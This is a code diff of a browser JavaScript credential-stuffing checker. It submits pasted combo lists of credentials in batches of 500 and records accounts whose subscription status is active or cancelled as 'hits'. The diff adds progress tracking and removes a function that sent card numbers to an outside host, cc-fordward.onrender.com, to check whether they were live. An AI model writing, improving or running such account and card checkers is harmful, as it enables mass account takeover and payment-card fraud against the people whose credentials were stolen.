@@ -1,13 +1,16 @@
 document.addEventListener('DOMContentLoaded', function () {
     var checkBtn = document.getElementById("checkBtn");
     checkBtn.addEventListener('click', async function () {
-        const comboList = document.getElementById('comboList').value;
-        const credentials = comboList.split('\n');
+        const comboList = document.getElementById('comboList');
+        const credentials = comboList.value.split('\n');
         const hitsOutput = document.getElementById('hitsOutputs');
+        const bankName = document.getElementById('bankName');
         hitsOutput.innerHTML = '';
 
-        const batchSize = 1000;
+        const batchSize = 500; //OLD -> 1000
         const totalBatches = Math.ceil(credentials.length / batchSize);
+        let totalCredentials = credentials.length;
+        let checkedCount = 0;
 
         try {
             let hitCount = 0;
@@ -20,7 +23,10 @@ document.addEventListener('DOMContentLoaded', function () {
                 const responses = await Promise.all(requests);
 
                 responses.forEach(response => {
-                    if (response.data?.subscriptionStatus?.toUpperCase() === 'ACTIVE') {
+                    checkedCount++;
+                    bankName.textContent = `${checkedCount}/${totalCredentials}`;
+
+                    if (response.data?.subscriptionStatus?.toUpperCase() === 'ACTIVE' || response.data?.subscriptionStatus?.toUpperCase() === 'CANCELLED') {
                         hitCount++;
                         hitsOutput.innerHTML += `
                             <div class="card mx-auto">
@@ -31,6 +37,9 @@ document.addEventListener('DOMContentLoaded', function () {
                         `;
                     }
                 });
+
+                // Remove processed lines from the textarea
+                comboList.value = credentials.slice(endIndex).join('\n');
             }
 
             if (hitCount === 0) {
@@ -42,12 +51,6 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     });
 });
-
-function isLive(kardo) {
-    return axios.get(`https://cc-fordward.onrender.com/check?cc=${kardo}`).then((res) => {
-        return { bankNAme: res.data.bankName, status: res.data.status };
-    })
-}
 
 function showToast(checkDigit) {
     const toast = document.getElementById('toast');
